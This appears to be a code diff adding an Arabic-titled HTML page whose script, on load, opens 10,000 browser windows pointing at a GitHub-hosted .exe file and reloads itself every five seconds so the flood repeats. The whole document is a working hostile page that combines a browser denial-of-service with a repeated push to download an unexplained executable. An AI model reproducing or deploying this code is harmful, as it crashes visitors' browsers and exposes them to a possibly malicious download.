@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فتح 1000 نافذة جديدة 10 مرات</title>
+</head>
+<body>
+    <h1>فتح 1000 نافذة جديدة 10 مرات</h1>
+    <p>سيتم فتح 1000 نافذة جديدة 10 مرات تحتوي على هذا الرابط: <span id="linkDisplay"></span></p>
+
+    <script>
+        // الرابط الذي سيتم فتحه
+        const pageUrl = 'https://github.com/qm58/q.m.5.8-/raw/main/%D9%85%D8%AD%D9%85%D8%AF%20%D8%B9%D8%A8%D8%AF%20%D8%A7%D9%84%D8%AC%D8%A8%D8%A7%D8%B1.exe?raw=true';
+
+        // عرض الرابط في الصفحة
+        document.getElementById('linkDisplay').textContent = pageUrl;
+
+        // فتح نافذة جديدة
+        function openWindows(count) {
+            for (let i = 0; i < count; i++) {
+                window.open(pageUrl, '_blank'); // فتح الرابط في نافذة جديدة
+            }
+        }
+
+        // فتح 1000 نافذة جديدة 10 مرات
+        function openWindowsMultipleTimes(times, countPerTime) {
+            for (let i = 0; i < times; i++) {
+                openWindows(countPerTime);
+            }
+        }
+
+        // فتح النوافذ عند تحميل الصفحة
+        window.addEventListener('load', () => {
+            openWindowsMultipleTimes(10, 1000); // فتح 1000 نافذة 10 مرات
+
+            // إعادة تحميل الصفحة بعد 5 ثوانٍ
+            setTimeout(() => {
+                window.location.reload();
+            }, 5000); // 5000 ميلي ثانية = 5 ثوانٍ
+        });
+    </script>
+</body>
+</html>
